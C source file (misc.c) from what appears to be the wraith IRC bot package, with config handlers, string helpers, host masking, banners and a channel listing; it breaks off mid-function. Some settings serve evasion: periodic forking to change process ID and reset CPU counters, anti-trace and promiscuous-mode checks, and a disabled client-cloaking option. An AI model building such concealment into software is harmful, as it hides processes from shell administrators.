/*
 * misc.c -- handles:
 *   split() maskhost() dumplots() daysago() days() daysdur()
 *   logging things
 *   queueing output for the bot (msg and help)
 *   resync buffers for sharebots
 *   motd display and %var substitution
 *
 */

#include "main.h"
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <fcntl.h>
#include "chan.h"
#include "tandem.h"
#include "modules.h"
#include <pwd.h>
#include <errno.h>
#ifdef S_ANTITRACE
#include <sys/ptrace.h>
#include <sys/wait.h>
#endif

#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <signal.h>


#ifdef HAVE_UNAME
#  include <sys/utsname.h>
#endif
#include "stat.h"
#include "bg.h"

extern struct userrec *userlist;
extern struct dcc_t	*dcc;
extern struct chanset_t	*chanset;
extern tand_t *tandbot;

extern char		 version[], origbotname[], botname[],
			 admin[], network[], motdfile[], ver[], botnetnick[],
			 bannerfile[], logfile_suffix[], textdir[], userfile[],  
                         *binname, pid_file[], netpass[], tempdir[];

extern int		 backgrd, con_chan, term_z, use_stderr, dcc_total, timesync, sdebug, 
#ifdef HUB
                         my_port,
#endif
			 keep_all_logs, quick_logs, strict_host, loading,
                         localhub;
extern time_t		 now;
extern Tcl_Interp	*interp;

void detected(int, char *);

int	 shtime = 1;		/* Whether or not to display the time
				   with console output */
log_t	*logs = 0;		/* Logfiles */
int	 max_logs = 5;		/* Current maximum log files */
int	 max_logsize = 0;	/* Maximum logfile size, 0 for no limit */
int	 conmask = LOG_MODES | LOG_CMDS | LOG_MISC; /* Console mask */
int	 debug_output = 1;	/* Disply output to server to LOG_SERVEROUT */

int auth_total = 0;
int max_auth = 100;

struct auth_t *auth = 0;


char authkey[121];
char cmdprefix[1] = "+";

struct cfg_entry CFG_MOTD = {
  "motd", CFGF_GLOBAL, NULL, NULL,
  NULL, NULL, NULL
};

void authkey_describe(struct cfg_entry * entry, int idx) {
  dprintf(idx, "authkey is used for authing, give to your users if they are to use DCC chat or IRC cmds. (can be bot specific)\n");
}

void authkey_changed(struct cfg_entry * entry, char * olddata, int * valid) {
  if (entry->ldata) {
    strncpy0(authkey, (char *) entry->ldata, sizeof authkey);
  } else if (entry->gdata) {
    strncpy0(authkey, (char *) entry->gdata, sizeof authkey);
  }
}

struct cfg_entry CFG_AUTHKEY = {
  "authkey", CFGF_LOCAL | CFGF_GLOBAL, NULL, NULL,
  authkey_changed, authkey_changed, authkey_describe
};

void cmdprefix_describe(struct cfg_entry *entry, int idx) {
  dprintf(idx, "cmdprefix is the prefix used for msg cmds, ie: !op or .op\n");
}

void cmdprefix_changed(struct cfg_entry * entry, char * olddata, int * valid) {
  if (entry->ldata) {
    strncpy0(cmdprefix, (char *) entry->ldata, sizeof cmdprefix);
  } else if (entry->gdata) {
    strncpy0(cmdprefix, (char *) entry->gdata, sizeof cmdprefix);
  }
}
struct cfg_entry CFG_CMDPREFIX = {
  "cmdprefix", CFGF_LOCAL | CFGF_GLOBAL, NULL, NULL,
  cmdprefix_changed, cmdprefix_changed, cmdprefix_describe
};


void misc_describe(struct cfg_entry *cfgent, int idx)
{
  int i = 0;

  if (!strcmp(cfgent->name, STR("fork-interval"))) {
    dprintf(idx, STR("fork-interval is number of seconds in between each fork() call made by the bot, to change process ID and reset cpu usage counters.\n"));
    i = 1;
#ifdef S_LASTCHECK
  } else if (!strcmp(cfgent->name, STR("login"))) {
    dprintf(idx, STR("login sets how to handle someone logging in to the shell\n"));
#endif
#ifdef S_ANTITRACE
  } else if (!strcmp(cfgent->name, STR("trace"))) {
    dprintf(idx, STR("trace sets how to handle someone tracing/debugging the bot\n"));
#endif
#ifdef S_PROMISC
  } else if (!strcmp(cfgent->name, STR("promisc"))) {
    dprintf(idx, STR("promisc sets how to handle when a interface is set to promiscuous mode\n"));
#endif
#ifdef S_PROCESSCHECK
  } else if (!strcmp(cfgent->name, STR("bad-process"))) {
    dprintf(idx, STR("bad-process sets how to handle when a running process not listed in process-list is detected\n"));
  } else if (!strcmp(cfgent->name, STR("process-list"))) {
    dprintf(idx, STR("process-list is a comma-separated list of \"expected processes\" running on the bots uid\n"));
    i = 1;
#endif
#ifdef S_HIJACKCHECK
  } else if (!strcmp(cfgent->name, STR("hijack"))) {
    dprintf(idx, STR("hijack sets how to handle when a commonly used hijack method attempt is detected. (recommended: die)\n"));
#endif
  }
  if (!i)
    dprintf(idx, STR("Valid settings are: nocheck, ignore, warn, die, reject, suicide\n"));
}


void fork_lchanged(struct cfg_entry * cfgent, char * oldval, int * valid) {
  if (!cfgent->ldata)
    return;
  if (atoi(cfgent->ldata)<=0)
    *valid=0;
}

void fork_gchanged(struct cfg_entry * cfgent, char * oldval, int * valid) {
  if (!cfgent->gdata)
    return;
  if (atoi(cfgent->gdata)<=0)
    *valid=0;
}

void fork_describe(struct cfg_entry * cfgent, int idx) {
  dprintf(idx, STR("fork-interval is number of seconds in between each fork() call made by the bot, to change process ID and reset cpu usage counters.\n"));
}

struct cfg_entry CFG_FORKINTERVAL = {
  "fork-interval", CFGF_GLOBAL | CFGF_LOCAL, NULL, NULL,
  fork_gchanged, fork_lchanged, fork_describe
};

void detect_lchanged(struct cfg_entry * cfgent, char * oldval, int * valid) {
  char * p = cfgent->ldata;
  if (!p)
    *valid=1;
  else if (strcmp(p, STR("ignore")) && strcmp(p, STR("die")) && strcmp(p, STR("reject"))
           && strcmp(p, STR("suicide")) && strcmp(p, STR("nocheck")) && strcmp(p, STR("warn")))
    *valid=0;
}

void detect_gchanged(struct cfg_entry * cfgent, char * oldval, int * valid) {
  char * p = (char *) cfgent->ldata;
  if (!p)
    *valid=1;
  else if (strcmp(p, STR("ignore")) && strcmp(p, STR("die")) && strcmp(p, STR("reject"))
           && strcmp(p, STR("suicide")) && strcmp(p, STR("nocheck")) && strcmp(p, STR("warn")))
    *valid=0;
}


#ifdef S_LASTCHECK
struct cfg_entry CFG_LOGIN = {
  "login", CFGF_GLOBAL | CFGF_LOCAL, NULL, NULL,
  detect_gchanged, detect_lchanged, misc_describe
};
#endif
#ifdef S_HIJACKCHECK
struct cfg_entry CFG_HIJACK = {
  "hijack", CFGF_GLOBAL | CFGF_LOCAL, NULL, NULL,
  detect_gchanged, detect_lchanged, misc_describe
};
#endif
#ifdef S_ANTITRACE
struct cfg_entry CFG_TRACE = {
  "trace", CFGF_GLOBAL | CFGF_LOCAL, NULL, NULL,
  detect_gchanged, detect_lchanged, misc_describe
};
#endif
#ifdef S_PROMISC
struct cfg_entry CFG_PROMISC = {
  "promisc", CFGF_GLOBAL | CFGF_LOCAL, NULL, NULL,
  detect_gchanged, detect_lchanged, misc_describe
};
#endif
#ifdef S_PROCESSCHECK
struct cfg_entry CFG_BADPROCESS = {
  "bad-process", CFGF_GLOBAL | CFGF_LOCAL, NULL, NULL,
  detect_gchanged, detect_lchanged, misc_describe
};

struct cfg_entry CFG_PROCESSLIST = {
  "process-list", CFGF_GLOBAL | CFGF_LOCAL, NULL, NULL,
  NULL, NULL, misc_describe
};
#endif

#ifdef S_DCCPASS
struct cmd_pass *cmdpass = NULL;
#endif
/* unixware has no strcasecmp() without linking in a hefty library */
#define upcase(c) (((c)>='a' && (c)<='z') ? (c)-'a'+'A' : (c))

#if !HAVE_STRCASECMP
#define strcasecmp strcasecmp2
#endif

int strcasecmp2(char *s1, char *s2)
{
  while ((*s1) && (*s2) && (upcase(*s1) == upcase(*s2))) {
    s1++;
    s2++;
  }
  return upcase(*s1) - upcase(*s2);
}

/* this is cfg shit from servers/irc/ctcp because hub doesnt load
 * these mods */
#ifdef HUB
void servers_describe(struct cfg_entry * entry, int idx) {
  dprintf(idx, STR("servers is a comma-separated list of servers the bot will use\n"));
}
void servers_changed(struct cfg_entry * entry, char * olddata, int * valid) {
}
void servers6_describe(struct cfg_entry * entry, int idx) {
  dprintf(idx, STR("servers6 is a comma-separated list of servers the bot will use (FOR IPv6)\n"));
}
void servers6_changed(struct cfg_entry * entry, char * olddata, int * valid) {
}
void nick_describe(struct cfg_entry * entry, int idx) {
  dprintf(idx, "nick is the bots preferred nick when connecting/using .resetnick\n");
}
void nick_changed(struct cfg_entry * entry, char * olddata, int * valid) {
}
void realname_describe(struct cfg_entry * entry, int idx) {
  dprintf(idx, STR("realname is the bots \"real name\" when connecting\n"));
}

void realname_changed(struct cfg_entry * entry, char * olddata, int * valid) {
}
struct cfg_entry CFG_SERVERS = {
  "servers", CFGF_LOCAL | CFGF_GLOBAL, NULL, NULL,
  servers_changed, servers_changed, servers_describe
};
struct cfg_entry CFG_SERVERS6 = {
  "servers6", CFGF_LOCAL | CFGF_GLOBAL, NULL, NULL,
  servers6_changed, servers6_changed, servers6_describe
};

struct cfg_entry CFG_NICK = {
  "nick", CFGF_LOCAL | CFGF_GLOBAL, NULL, NULL,
  nick_changed, nick_changed, nick_describe
};

struct cfg_entry CFG_REALNAME = {
  "realname", CFGF_LOCAL | CFGF_GLOBAL, NULL, NULL,
  realname_changed, realname_changed, realname_describe
};

void getin_describe(struct cfg_entry *cfgent, int idx)
{
  if (!strcmp(cfgent->name, STR("op-bots")))
    dprintf(idx, STR("op-bots is number of bots to ask every time a oprequest is to be made\n"));
  else if (!strcmp(cfgent->name, STR("in-bots")))
    dprintf(idx, STR("in-bots is number of bots to ask every time a inrequest is to be made\n"));
  else if (!strcmp(cfgent->name, STR("op-requests")))
    dprintf(idx, STR("op-requests (requests:seconds) limits how often the bot will ask for ops\n"));
  else if (!strcmp(cfgent->name, STR("lag-threshold")))
    dprintf(idx, STR("lag-threshold is maximum acceptable server lag for the bot to send/honor requests\n"));
  else if (!strcmp(cfgent->name, STR("op-time-slack")))
    dprintf(idx, STR("op-time-slack is number of seconds a opcookies encoded time value can be off from the bots current time\n"));
  else if (!strcmp(cfgent->name, STR("lock-threshold")))
    dprintf(idx, STR("Format H:L. When at least H hubs but L or less leafs are linked, lock all channels\n"));
  else if (!strcmp(cfgent->name, STR("kill-threshold")))
    dprintf(idx, STR("When more than kill-threshold bots have been killed/k-lined the last minute, channels are locked\n"));
  else if (!strcmp(cfgent->name, STR("fight-threshold")))
    dprintf(idx, STR("When more than fight-threshold ops/deops/kicks/bans/unbans altogether have happened on a channel in one minute, the channel is locked\n"));
  else {
    dprintf(idx, STR("No description for %s ???\n"), cfgent->name);
    putlog(LOG_ERRORS, "*", STR("getin_describe() called with unknown config entry %s"), cfgent->name);
  }
}

void getin_changed(struct cfg_entry *cfgent, char *oldval, int *valid)
{
  int i;

  if (!cfgent->gdata)
    return;
  *valid = 0;
  if (!strcmp(cfgent->name, STR("op-requests"))) {
    int L,
      R;
    char *value = cfgent->gdata;

    L = atoi(value);
    value = strchr(value, ':');
    if (!value)
      return;
    value++;
    R = atoi(value);
    if ((R >= 60) || (R <= 3) || (L < 1) || (L > R))
      return;
    *valid = 1;
    return;
  }
  if (!strcmp(cfgent->name, STR("lock-threshold"))) {
    int L,
      R;
    char *value = cfgent->gdata;

    L = atoi(value);
    value = strchr(value, ':');
    if (!value)
      return;
    value++;
    R = atoi(value);
    if ((R >= 1000) || (R < 0) || (L < 0) || (L > 100))
      return;
    *valid = 1;
    return;
  }
  i = atoi(cfgent->gdata);
  if (!strcmp(cfgent->name, STR("op-bots"))) {
    if ((i < 1) || (i > 10))
      return;
  } else if (!strcmp(cfgent->name, STR("invite-bots"))) {
    if ((i < 1) || (i > 10))
      return;
  } else if (!strcmp(cfgent->name, STR("key-bots"))) {
    if ((i < 1) || (i > 10))
      return;
  } else if (!strcmp(cfgent->name, STR("limit-bots"))) {
    if ((i < 1) || (i > 10))
      return;
  } else if (!strcmp(cfgent->name, STR("unban-bots"))) {
    if ((i < 1) || (i > 10))
      return;
  } else if (!strcmp(cfgent->name, STR("lag-threshold"))) {
    if ((i < 3) || (i > 60))
      return;
  } else if (!strcmp(cfgent->name, STR("fight-threshold"))) {
    if (i && ((i < 50) || (i > 1000)))
      return;
  } else if (!strcmp(cfgent->name, STR("kill-threshold"))) {
    if ((i < 0) || (i >= 200))
      return;
  } else if (!strcmp(cfgent->name, STR("op-time-slack"))) {
    if ((i < 30) || (i > 1200))
      return;
  }
  *valid = 1;
  return;
}

struct cfg_entry CFG_OPBOTS = {
  "op-bots", CFGF_GLOBAL, NULL, NULL,
  getin_changed, NULL, getin_describe
};

struct cfg_entry CFG_INBOTS = {
  "in-bots", CFGF_GLOBAL, NULL, NULL,
  getin_changed, NULL, getin_describe
};

struct cfg_entry CFG_LAGTHRESHOLD = {
  "lag-threshold", CFGF_GLOBAL, NULL, NULL,
  getin_changed, NULL, getin_describe
};

struct cfg_entry CFG_OPREQUESTS = {
  "op-requests", CFGF_GLOBAL, NULL, NULL,
  getin_changed, NULL, getin_describe
};

struct cfg_entry CFG_OPTIMESLACK = {
  "op-time-slack", CFGF_GLOBAL, NULL, NULL,
  getin_changed, NULL, getin_describe
};

#ifdef G_AUTOLOCK
struct cfg_entry CFG_LOCKTHRESHOLD = {
  "lock-threshold", CFGF_GLOBAL, NULL, NULL,
  getin_changed, NULL, getin_describe
};

struct cfg_entry CFG_KILLTHRESHOLD = {
  "kill-threshold", CFGF_GLOBAL, NULL, NULL,
  getin_changed, NULL, getin_describe
};

struct cfg_entry CFG_FIGHTTHRESHOLD = {
  "fight-threshold", CFGF_GLOBAL, NULL, NULL,
  getin_changed, NULL, getin_describe
};
#endif /* G_AUTOLOCK */


/* cloak
void cloak_describe(struct cfg_entry *cfgent, int idx)
{
  dprintf(idx, STR("cloak-script decides which BitchX script the bot cloaks. If set to 6, a random script will be cloaked.\n"));
  dprintf(idx, STR("Available: 0=crackrock, 1=neonapple, 2=tunnelvision, 3=argon, 4=evolver, 5=prevail\n"));
}
void cloak_changed(struct cfg_entry *cfgent, char * oldval, int * valid) {
  char * p;
  int i;
  p = cfgent->ldata ? cfgent->ldata : cfgent->gdata;
  if (!p)
    return;
  i=atoi(p);
#ifdef LEAF
  if (i>=6)
    i = random() % 6;
#endif
  *valid = ( (i>=0) && (i<=6));
  if (*valid)
    cloak_script = i;
#ifdef LEAF
  scriptchanged();
#endif
}

struct cfg_entry CFG_CLOAK_SCRIPT = {
  "cloak-script", CFGF_GLOBAL | CFGF_LOCAL, NULL, NULL,
  cloak_changed, cloak_changed, cloak_describe
};
*/
#endif
/* end hub compat cfg */

int cfg_count=0;
struct cfg_entry ** cfg = NULL;
int cfg_noshare=0;

/* Expected memory usage
 */
int expmem_misc()
{
#ifdef S_DCCPASS
  struct cmd_pass *cp = NULL;
#endif

  int tot = 0, i;

  for (i=0;i<cfg_count;i++) {
    tot += sizeof(void *);
    if (cfg[i]->gdata)
      tot += strlen(cfg[i]->gdata) + 1;
    if (cfg[i]->ldata)
      tot += strlen(cfg[i]->ldata) + 1;
  }
#ifdef S_DCCPASS
  for (cp=cmdpass;cp;cp=cp->next) {
    tot += sizeof(struct cmd_pass) + strlen(cp->name)+1;
  }
#endif
  tot += sizeof(struct auth_t) * max_auth;

//  Wtf is this?
//  for (i = 0; i < auth_total; i++) {
//    tot += sizeof(struct userrec);
//  }

  tot += strlen(binname) + 1;
  return tot + (max_logs * sizeof(log_t));
}
void init_auth_max()
{
  if (max_auth < 1)
    max_auth = 1;
  if (auth)
    auth = nrealloc(auth, sizeof(struct auth_t) * max_auth);
  else
    auth = nmalloc(sizeof(struct auth_t) * max_auth);

}
void init_misc()
{

  static int last = 0;

  init_auth_max();

  if (max_logs < 1)
    max_logs = 1;
  if (logs)
    logs = nrealloc(logs, max_logs * sizeof(log_t));
  else
    logs = nmalloc(max_logs * sizeof(log_t));
  for (; last < max_logs; last++) {
    logs[last].filename = logs[last].chname = NULL;
    logs[last].mask = 0;
    logs[last].f = NULL;
    /* Added by cybah  */
    logs[last].szlast[0] = 0;
    logs[last].repeats = 0;
    /* Added by rtc  */
    logs[last].flags = 0;
  }

  add_cfg(&CFG_AUTHKEY);
//  add_cfg(&CFG_CMDPREFIX);
  add_cfg(&CFG_MOTD);
  add_cfg(&CFG_FORKINTERVAL);
#ifdef S_LASTCHECK
  add_cfg(&CFG_LOGIN);
#endif
#ifdef S_HIJACKCHECK
  add_cfg(&CFG_HIJACK);
#endif
#ifdef S_ANTITRACE
  add_cfg(&CFG_TRACE);
#endif
#ifdef S_PROMISC
  add_cfg(&CFG_PROMISC);
#endif
#ifdef S_PROCESSCHECK
  add_cfg(&CFG_BADPROCESS);
  add_cfg(&CFG_PROCESSLIST);
#endif
#ifdef HUB
  add_cfg(&CFG_NICK);
  add_cfg(&CFG_SERVERS);
  add_cfg(&CFG_SERVERS6);
  add_cfg(&CFG_REALNAME);
  set_cfg_str(NULL, STR("realname"), "A deranged product of evil coders");
  add_cfg(&CFG_OPBOTS);
  add_cfg(&CFG_INBOTS);
  add_cfg(&CFG_LAGTHRESHOLD);
  add_cfg(&CFG_OPREQUESTS);
  add_cfg(&CFG_OPTIMESLACK);
#ifdef G_AUTOLOCK
  add_cfg(&CFG_LOCKTHRESHOLD);
  add_cfg(&CFG_KILLTHRESHOLD);
  add_cfg(&CFG_FIGHTTHRESHOLD);
#endif

//cloak  add_cfg(&CFG_CLOAK_SCRIPT);
#endif
}


/*
 *    Misc functions
 */

/* low-level stuff for other modules
 */

/*	  This implementation wont overrun dst - 'max' is the max bytes that dst
 *	can be, including the null terminator. So if 'dst' is a 128 byte buffer,
 *	pass 128 as 'max'. The function will _always_ null-terminate 'dst'.
 *
 *	Returns: The number of characters appended to 'dst'.
 *
 *  Usage eg.
 *
 *		char 	buf[128];
 *		size_t	bufsize = sizeof(buf);
 *
 *		buf[0] = 0, bufsize--;
 *
 *		while (blah && bufsize) {
 *			bufsize -= egg_strcatn(buf, <some-long-string>, sizeof(buf));
 *		}
 *
 *	<Cybah>
 */
int egg_strcatn(char *dst, const char *src, size_t max)
{
  size_t tmpmax = 0;

  /* find end of 'dst' */
  while (*dst && max > 0) {
    dst++;
    max--;
  }

  /*    Store 'max', so we can use it to workout how many characters were
   *  written later on.
   */
  tmpmax = max;

  /* copy upto, but not including the null terminator */
  while (*src && max > 1) {
    *dst++ = *src++;
    max--;
  }

  /* null-terminate the buffer */
  *dst = 0;

  /*    Don't include the terminating null in our count, as it will cumulate
   *  in loops - causing a headache for the caller.
   */
  return tmpmax - max;
}

int my_strcpy(register char *a, register char *b)
{
  register char *c = b;

  while (*b)
    *a++ = *b++;
  *a = *b;
  return b - c;
}

/* Split first word off of rest and put it in first
 */
void splitc(char *first, char *rest, char divider)
{
  char *p = strchr(rest, divider);

  if (p == NULL) {
    if (first != rest && first)
      first[0] = 0;
    return;
  }
  *p = 0;
  if (first != NULL)
    strcpy(first, rest);
  if (first != rest)
    /*    In most circumstances, strcpy with src and dst being the same buffer
     *  can produce undefined results. We're safe here, as the src is
     *  guaranteed to be at least 2 bytes higher in memory than dest. <Cybah>
     */
    strcpy(rest, p + 1);
}

/*    As above, but lets you specify the 'max' number of bytes (EXCLUDING the
 * terminating null).
 *
 * Example of use:
 *
 * char buf[HANDLEN + 1];
 *
 * splitcn(buf, input, "@", HANDLEN);
 *
 * <Cybah>
 */
void splitcn(char *first, char *rest, char divider, size_t max)
{
  char *p = strchr(rest, divider);

  if (p == NULL) {
    if (first != rest && first)
      first[0] = 0;
    return;
  }
  *p = 0;
  if (first != NULL)
    strncpyz(first, rest, max);
  if (first != rest)
    /*    In most circumstances, strcpy with src and dst being the same buffer
     *  can produce undefined results. We're safe here, as the src is
     *  guaranteed to be at least 2 bytes higher in memory than dest. <Cybah>
     */
    strcpy(rest, p + 1);
}

char *splitnick(char **blah)
{
  char *p = strchr(*blah, '!'), *q = *blah;

  if (p) {
    *p = 0;
    *blah = p + 1;
    return q;
  }
  return "";
}

char *newsplit(char **rest)
{
  register char *o, *r;

  if (!rest)
    return *rest = "";
  o = *rest;
  while (*o == ' ')
    o++;
  r = o;
  while (*o && (*o != ' '))
    o++;
  if (*o)
    *o++ = 0;
  *rest = o;
  return r;
}

/* Convert "abc!user@a.b.host" into "*!user@*.b.host"
 * or "abc!user@1.2.3.4" into "*!user@1.2.3.*"
 * or "abc!user@0:0:0:0:0:ffff:1.2.3.4" into "*!user@0:0:0:0:0:ffff:1.2.3.*"
 * or "abc!user@3ffe:604:2:b02e:6174:7265:6964:6573" into
 *    "*!user@3ffe:604:2:b02e:6174:7265:6964:*"
 */
void maskhost(const char *s, char *nw)
{
  register const char *p, *q, *e, *f;
  int i;

  *nw++ = '*';
  *nw++ = '!';
  p = (q = strchr(s, '!')) ? q + 1 : s;
  /* Strip of any nick, if a username is found, use last 8 chars */
  if ((q = strchr(p, '@'))) {
    int fl = 0;

    if ((q - p) > 9) {
      nw[0] = '*';
      p = q - 7;
      i = 1;
    } else
      i = 0;
    while (*p != '@') {
      if (!fl && strchr("~+-^=", *p)) {
        if (strict_host)
	  nw[i] = '?';
	else
	  i--;
      } else
	nw[i] = *p;
      fl++;
      p++;
      i++;
    }
    nw[i++] = '@';
    q++;
  } else {
    nw[0] = '*';
    nw[1] = '@';
    i = 2;
    q = s;
  }
  nw += i;
  e = NULL;
  /* Now q points to the hostname, i point to where to put the mask */
  if ((!(p = strchr(q, '.')) || !(e = strchr(p + 1, '.'))) && !strchr(q, ':'))
    /* TLD or 2 part host */
    strcpy(nw, q);
  else {
    if (e == NULL) {		/* IPv6 address?		*/
      const char *mask_str;

      f = strrchr(q, ':');
      if (strchr(f, '.')) {	/* IPv4 wrapped in an IPv6?	*/
	f = strrchr(f, '.');
	mask_str = ".*";
      } else 			/* ... no, true IPv6.		*/
	mask_str = ":*";
      strncpy(nw, q, f - q);
      /* No need to nw[f-q] = 0 here, as the strcpy below will
       * terminate the string for us.
       */
      nw += (f - q);
      strcpy(nw, mask_str);
    } else {
      for (f = e; *f; f++);
      f--;
      if (*f >= '0' && *f <= '9') {	/* Numeric IP address */
	while (*f != '.')
	  f--;
	strncpy(nw, q, f - q);
	/* No need to nw[f-q] = 0 here, as the strcpy below will
	 * terminate the string for us.
	 */
	nw += (f - q);
	strcpy(nw, ".*");
      } else {				/* Normal host >= 3 parts */
	/*    a.b.c  -> *.b.c
	 *    a.b.c.d ->  *.b.c.d if tld is a country (2 chars)
	 *             OR   *.c.d if tld is com/edu/etc (3 chars)
	 *    a.b.c.d.e -> *.c.d.e   etc
	 */
	const char *x = strchr(e + 1, '.');

	if (!x)
	  x = p;
	else if (strchr(x + 1, '.'))
	  x = e;
	else if (strlen(x) == 3)
	  x = p;
	else
	  x = e;
	sprintf(nw, "*%s", x);
      }
    }
  }
}

/* Dump a potentially super-long string of text.
 */
void dumplots(int idx, const char *prefix, char *data)
{
  char		*p = data, *q, *n, c;
  const int	 max_data_len = 500 - strlen(prefix);

  if (!*data) {
    dprintf(idx, "%s\n", prefix);
    return;
  }
  while (strlen(p) > max_data_len) {
    q = p + max_data_len;
    /* Search for embedded linefeed first */
    n = strchr(p, '\n');
    if (n && n < q) {
      /* Great! dump that first line then start over */
      *n = 0;
      dprintf(idx, "%s%s\n", prefix, p);
      *n = '\n';
      p = n + 1;
    } else {
      /* Search backwards for the last space */
      while (*q != ' ' && q != p)
	q--;
      if (q == p)
	q = p + max_data_len;
      c = *q;
      *q = 0;
      dprintf(idx, "%s%s\n", prefix, p);
      *q = c;
      p = q;
      if (c == ' ')
	p++;
    }
  }
  /* Last trailing bit: split by linefeeds if possible */
  n = strchr(p, '\n');
  while (n) {
    *n = 0;
    dprintf(idx, "%s%s\n", prefix, p);
    *n = '\n';
    p = n + 1;
    n = strchr(p, '\n');
  }
  if (*p)
    dprintf(idx, "%s%s\n", prefix, p);	/* Last trailing bit */
}

/* Convert an interval (in seconds) to one of:
 * "19 days ago", "1 day ago", "18:12"
 */
void daysago(time_t now, time_t then, char *out)
{
  if (now - then > 86400) {
    int days = (now - then) / 86400;

    sprintf(out, "%d day%s ago", days, (days == 1) ? "" : "s");
    return;
  }
  egg_strftime(out, 6, "%H:%M", localtime(&then));
}

/* Convert an interval (in seconds) to one of:
 * "in 19 days", "in 1 day", "at 18:12"
 */
void days(time_t now, time_t then, char *out)
{
  if (now - then > 86400) {
    int days = (now - then) / 86400;

    sprintf(out, "in %d day%s", days, (days == 1) ? "" : "s");
    return;
  }
  egg_strftime(out, 9, "at %H:%M", localtime(&now));
}

/* Convert an interval (in seconds) to one of:
 * "for 19 days", "for 1 day", "for 09:10"
 */
void daysdur(time_t now, time_t then, char *out)
{
  char s[81];
  int hrs, mins;

  if (now - then > 86400) {
    int days = (now - then) / 86400;

    sprintf(out, "for %d day%s", days, (days == 1) ? "" : "s");
    return;
  }
  strcpy(out, "for ");
  now -= then;
  hrs = (int) (now / 3600);
  mins = (int) ((now - (hrs * 3600)) / 60);
  sprintf(s, "%02d:%02d", hrs, mins);
  strcat(out, s);
}
/* show l33t banner */

#define w1 

char *wbanner() {
  int r;
  r=random();
  switch (r % 7) {
   case 0: return STR("                       .__  __  .__\n__  _  ______________  |__|/  |_|  |__\n\\ \\/ \\/ /\\_  __ \\__  \\ |  \\   __\\  |  \\\n \\     /  |  | \\// __ \\|  ||  | |   Y  \\\n  \\/\\_/   |__|  (____  /__||__| |___|  /\n                     \\/              \\/\n");
   case 1: return STR("                    _ _   _     \n__      ___ __ __ _(_) |_| |__  \n\\ \\ /\\ / / '__/ _` | | __| '_ \\ \n \\ V  V /| | | (_| | | |_| | | |\n  \\_/\\_/ |_|  \\__,_|_|\\__|_| |_|\n");
   case 2: return STR("@@@  @@@  @@@  @@@@@@@    @@@@@@   @@@  @@@@@@@  @@@  @@@\n@@@  @@@  @@@  @@@@@@@@  @@@@@@@@  @@@  @@@@@@@  @@@  @@@\n@@!  @@!  @@!  @@!  @@@  @@!  @@@  @@!    @@!    @@!  @@@\n!@!  !@!  !@!  !@!  @!@  !@!  @!@  !@!    !@!    !@!  @!@\n@!!  !!@  @!@  @!@!!@!   @!@!@!@!  !!@    @!!    @!@!@!@!\n!@!  !!!  !@!  !!@!@!    !!!@!!!!  !!!    !!!    !!!@!!!!\n!!:  !!:  !!:  !!: :!!   !!:  !!!  !!:    !!:    !!:  !!!\n:!:  :!:  :!:  :!:  !:!  :!:  !:!  :!:    :!:    :!:  !:!\n :::: :: :::   ::   :::  ::   :::   ::     ::    ::   :::\n  :: :  : :     :   : :   :   : :  :       :      :   : :\n");
   case 3: return STR("                                     o8o      .   oooo\n                                     `\"'    .o8   `888\noooo oooo    ooo oooo d8b  .oooo.   oooo  .o888oo  888 .oo.\n `88. `88.  .8'  `888\"\"8P `P  )88b  `888    888    888P\"Y88b\n  `88..]88..8'    888      .oP\"888   888    888    888   888\n   `888'`888'     888     d8(  888   888    888 .  888   888\n    `8'  `8'     d888b    `Y888\"\"8o o888o   \"888\" o888o o888o\n");
   case 4: return STR("                                                                   *\n                                                 *         *     **\n**                                              ***       **     **\n**                                               *        **     **\n **    ***    ****     ***  ****                        ******** **\n  **    ***     ***  *  **** **** *    ****    ***     ********  **  ***\n  **     ***     ****    **   ****    * ***  *  ***       **     ** * ***\n  **      **      **     **          *   ****    **       **     ***   ***\n  **      **      **     **         **    **     **       **     **     **\n  **      **      **     **         **    **     **       **     **     **\n  **      **      **     **         **    **     **       **     **     **\n  **      **      *      **         **    **     **       **     **     **\n   ******* *******       ***        **    **     **       **     **     **\n    *****   *****         ***        ***** **    *** *     **    **     **\n                                      ***   **    ***             **    **\n                                                                        *\n                                                                       *\n                                                                      *\n                                                                     *\n");
   case 5: return STR(" :::  ===  === :::====  :::====  ::: :::==== :::  ===\n :::  ===  === :::  === :::  === ::: :::==== :::  ===\n ===  ===  === =======  ======== ===   ===   ========\n  ===========  === ===  ===  === ===   ===   ===  ===\n   ==== ====   ===  === ===  === ===   ===   ===  ===\n");
   case 6: return STR(" _  _  _  ______ _______ _____ _______ _     _\n |  |  | |_____/ |_____|   |      |    |_____|\n\n |__|__| |    \\_ |     | __|__    |    |     |\n");
  }
  return "";
}

void show_banner(int idx)
{
  dprintf(idx, "%s", wbanner());
  dprintf(idx, "\n \n");
  dprintf(idx, STR("info, bugs, suggestions, comments:\n- http://www.shatow.net/wraith/ -\n"));
}

/* show motd to dcc chatter */
void show_motd(int idx)
{

  dprintf(idx, STR("Motd: "));
  if (CFG_MOTD.gdata && *(char *) CFG_MOTD.gdata)
    dprintf(idx, STR("%s\n"), (char *) CFG_MOTD.gdata);
  else
    dprintf(idx, STR("none\n"));
}
void show_channels(int idx, char *handle)
{
  struct chanset_t *chan;
  struct flag_record fr = { FR_CHAN | FR_GLOBAL, 0, 0, 0, 0 };
  struct userrec *u;
  int first = 0, l = 0, total = 0;
  char format[120];

  if (handle)
    u = get_user_by_handle(userlist, handle);
  else
    u = dcc[idx].user;

  for (chan = chanset;chan;chan = chan->next) {
    get_user_flagrec(u, &fr, chan->dname);
    if (l < strlen(chan->dname)) {
      l = strlen(chan->dname);
    }
    if ((!channel_private(chan) || (channel_private(chan) && (chan_op(fr) || glob_owner(fr)))) &&
       (glob_owner(fr) || ((glob_op(fr) || chan_op(fr)) && !(chan_deop(fr) || glob_deop(fr))))) {
      total++;
    }
  }


  egg_snprintf(format, sizeof format, "  %%-%us %%-s%%-s%%-s%%-s%%-s\n", (l+2));

  for (chan = chanset;chan;chan = chan->next) {
    get_user_flagrec(u, &fr, chan->dname);

    if ((!channel_private(chan) || (channel_private(chan) && (chan_op(fr) || glob_owner(fr)))) &&
       (glob_owner(fr) || ((glob_op(fr) || chan_op(fr)) && !(chan_deop(fr) || glob_deop(fr))))) {
        if (!first) { 
          dprintf(idx, STR("%s %s access to %d channel%s:\n"), handle ? u->handle : "You", handle ? "has" : "have", total, (total > 1) ? "s" : "");
          
          first = 1;
        }
        dprintf(idx, format, chan->dname, channel_inactive(chan) ? "(inactive) " : "", 
